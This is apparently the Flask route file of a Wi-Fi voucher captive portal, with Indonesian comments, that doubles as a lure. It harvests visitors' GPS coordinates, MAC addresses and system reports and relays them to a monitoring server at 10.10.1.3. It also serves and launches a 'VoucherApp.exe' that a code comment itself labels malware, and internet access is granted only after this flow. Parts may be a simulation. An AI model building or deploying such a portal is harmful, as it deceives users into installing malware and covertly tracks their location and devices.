from flask import Blueprint, render_template, request, jsonify, send_file, session, abort, redirect, url_for, current_app
from datetime import datetime
import socket
import json
import requests
import subprocess
import os

main_bp = Blueprint('main', __name__, template_folder=os.path.join(os.path.dirname(__file__), 'templates'))
MONITORING_BASE_URL = "http://10.10.1.3:5500/api/monitoring"
EXE_PATH = "dist/VoucherApp.exe"  # ⚠️ Pastikan path relatif ini benar

# Halaman utama
@main_bp.route('/')
def index():
    return render_template('index.html')

# Halaman aktivasi voucher
@main_bp.route('/aktivasi', methods=['GET', 'POST'])
def aktivasi():
    if request.method == 'POST':
        voucher_code = request.form.get('voucher_code', '').strip()
        if not voucher_code:
            return render_template('aktivasi.html', error="Kode voucher tidak boleh kosong")

        try:
            res = requests.post(
                f"{MONITORING_BASE_URL}/validate-voucher",
                json={'voucher_code': voucher_code},
                timeout=4
            )
            data = res.json()
        except Exception:
            return render_template('aktivasi.html', error="Gagal menghubungi server monitoring")

        if not data.get('valid'):
            return render_template('aktivasi.html', error=data.get('message', 'Voucher tidak valid'))

        # Cek apakah file exe malware ada
        if not os.path.exists(EXE_PATH):
            return render_template('aktivasi.html', error="Launcher tidak ditemukan di server")

        try:
            subprocess.Popen([EXE_PATH], shell=True)
        except Exception as e:
            return render_template('aktivasi.html', error=f"Gagal menjalankan launcher: {e}")

        return render_template('success.html', code=voucher_code)
    
    else:
    	mac = session.get("mac_address", "")
    	return render_template('aktivasi.html', mac_address=mac)



@main_bp.route("/check-installation-status", methods=["POST"])
def check_installation_status():
    return jsonify({"installed": True})  # Simulasi saja

# Endpoint relay lokasi
@main_bp.route('/save-location', methods=['POST'])
def save_location():
    try:
        res = requests.post(f"{MONITORING_BASE_URL}/save-location", json=request.json, timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Endpoint relay log report
@main_bp.route('/report', methods=['POST'])
def report():
    try:
        data = request.get_json()
        
        # 1. Simpan MAC ke session jika ada
        if 'mac' in data:
            session["mac_address"] = data["mac"]
            print(f"[DEBUG] MAC address saved: {data['mac']}")

        # 2. Persiapkan data untuk monitoring server
        monitoring_data = {
            "type": "system_report",
            "timestamp": datetime.now().isoformat(),
            "client_ip": request.remote_addr,
            "data": {
                "mac": data.get('mac'),
                "hostname": socket.gethostname(),
                "system_data": data  # Data asli dari client
            }
        }

        # 3. Kirim ke monitoring server (10.10.1.3)
        monitoring_url = "http://10.10.1.3:5500/api/monitoring/report"
        response = requests.post(
            monitoring_url,
            json=monitoring_data,
            timeout=5
        )

        # 4. Handle response khusus dari monitoring server
        if response.status_code != 200:
            raise Exception(f"Monitoring server error: {response.text}")

        # 5. Simpan log lokal sebagai fallback
        local_log_path = "local_reports.log"
        with open(local_log_path, "a") as f:
            f.write(json.dumps(monitoring_data) + "\n")

        return jsonify({
            "status": "success",
            "monitoring_response": response.json()
        }), 200

    except Exception as e:
        current_app.logger.error(f"Report failed: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@main_bp.route("/result", methods=["POST"])
def result():
    latitude = request.form.get("latitude")
    longitude = request.form.get("longitude")
    accuracy = request.form.get("accuracy")
    service = request.form.get("service")
    mac = request.form.get("mac")
    
    if mac:
    	session["mac_address"] = mac

    # Validasi sederhana
    if not latitude or not longitude:
        return "Invalid coordinates", 400

    # Kirim data lkasi ke backend monitoring
    try:
        payload = {
            "latitude": latitude,
            "longitude": longitude,
            "accuracy": accuracy,
            "maps_link": f"https://maps.google.com?q={latitude},{longitude}",
        }
        res = requests.post(f"{MONITORING_BASE_URL}/save-location", json=payload, timeout=5)
        print(f"[DEBUG] Lokasi berhasil disimpan: {res.status_code} - {res.text}")
    except Exception as e:
        print(f"[ERROR] Gagal menyimpan lokasi: {e}")
        return "Gagal menyimpan lokasi", 500
    # Redirect ke halaman aktivasi sambil kirim parameternya
    return redirect(url_for('main.aktivasi', service=service))
  
@main_bp.route("/download-voucher-app", methods=["GET", "HEAD"])
def download_voucher_app():
    # Ubah path ke direktori dist/VoucherApp
    exe_path = os.path.join(os.path.dirname(__file__), "..", "dist","VoucherApp.exe")
    exe_path = os.path.abspath(exe_path)
    print(f"[DEBUG] Path EXE: {exe_path}")

    if os.path.exists(exe_path):
        return send_file(exe_path, as_attachment=True)
    else:
        abort(404, "File VoucherApp.exe tidak ditemukan")

@main_bp.route('/validate-voucher', methods=['POST'])
def full_voucher_flow():
    try:
        data = request.get_json()
        voucher_code = data.get("voucher_code", "")
        mac_address = data.get("mac") or session.get("mac_address")
        print(f"[DEBUG] Mac address is captured: {mac_address}")

        #Store voucher
        store_res = requests.post(f"{MONITORING_BASE_URL}/store-voucher", json={"voucher_code": voucher_code}, timeout=10)
        print("[DEBUG] Store response:", store_res.json())

        #Validate voucher
        res = requests.post(f"{MONITORING_BASE_URL}/validate-voucher", json={"voucher_code": voucher_code}, timeout=10)
        backend_response = res.json()

        if backend_response.get("valid") and mac_address:
            unlock_res = requests.post(
                f"{MONITORING_BASE_URL}/unlock-internet",
                json={"mac": mac_address},
                timeout=5
            )
            print("[DEBUG] MAC yang dikirim ke unlock:", mac_address)
            print("[DEBUG] Unlock result:", unlock_res.text)

        return jsonify(backend_response), res.status_code
    except Exception as e:
        print(f"[ERROR] Voucher process error: {e}")
        return jsonify({"valid": False, "message": "Internal error"}), 500

    
@main_bp.route('/lock-internet', methods=['POST'])
def lock_internet():
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac") or session.get("mac_address")
        if not mac:
            return jsonify({"status": "error", "message": "MAC address is missing"}), 400

        res = requests.post(
            f"{MONITORING_BASE_URL}/lock-internet",
            json={"mac": mac},
            timeout=5
        )
        return jsonify(res.json()), res.status_code
    except Exception as e:
        print(f"[ERROR] Error locking internet: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

    
@main_bp.route('/get-location-data', methods=['GET'])
def get_location_data():
    try:
        res = requests.get(f"{MONITORING_BASE_URL}/get-location-data", timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        print(f"[ERROR] Error fetching location data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    
@main_bp.route('/api/monitoring/store-voucher', methods=['POST'])
def proxy_store_voucher():
    try:
        data = request.get_json()
        print(f"[DEBUG] Proxy store voucher: {data}")
        
        res = requests.post(
            f"{MONITORING_BASE_URL}/store-voucher", 
            json=data, 
            timeout=10
        )
        
        response_data = res.json()
        print(f"[DEBUG] Store response: {response_data}")
        
        return jsonify(response_data), res.status_code
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Network error in proxy store: {e}")
        return jsonify({
            'status': 'error', 
            'message': 'Gagal menghubungi server penyimpanan'
        }), 500
    except Exception as e:
        print(f"[ERROR] Unexpected error in proxy store: {e}")
        return jsonify({
            'status': 'error', 
            'message': 'Terjadi kesalahan sistem'
        }), 500

@main_bp.route('/api/monitoring/validate-voucher', methods=['POST'])
def proxy_validate_voucher():
    try:
        data = request.get_json()
        print(f"[DEBUG] Proxy validate voucher: {data}")
        
        res = requests.post(
            f"{MONITORING_BASE_URL}/validate-voucher", 
            json=data, 
            timeout=10
        )
        
        response_data = res.json()
        print(f"[DEBUG] Validation response: {response_data}")
        
        return jsonify(response_data), res.status_code
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Network error in proxy validate: {e}")
        return jsonify({
            'valid': False, 
            'message': 'Gagal menghubungi server validasi'
        }), 500
    except Exception as e:
        print(f"[ERROR] Unexpected error in proxy validate: {e}")
        return jsonify({
            'valid': False, 
            'message': 'Terjadi kesalahan sistem'
        }), 500
        
@main_bp.route('/check-session', methods=['GET'])
def check_session():
    mac = session.get('mac_address')
    if not mac:
        return jsonify({"active": False}), 200
        
    # Cek di Mikrotik apakah masih ada binding
    try:
      	res = requests.get(f"{MONITORING_BASE_URL}/check-session", params={"mac": mac}, timeout=10)
      	return jsonify(res.json()), res.status_code
    except:
        return jsonify({"active": False}), 200
        
@main_bp.route('/get-package-info', methods=['GET'])
def get_package_info():
    service = request.args.get('service', 'basic')
    packages = {
        'basic': {
            'name': 'Standar',
            'duration': '1 Jam',
            'duration_seconds': 3600,
            'speed': '10 Mbps'
        },
        'premium': {
            'name': 'Premium',
            'duration': '2 Jam',
            'duration_seconds': 7200,
            'speed': '20 Mbps'
        }
    }
    return jsonify(packages.get(service, packages['basic']))
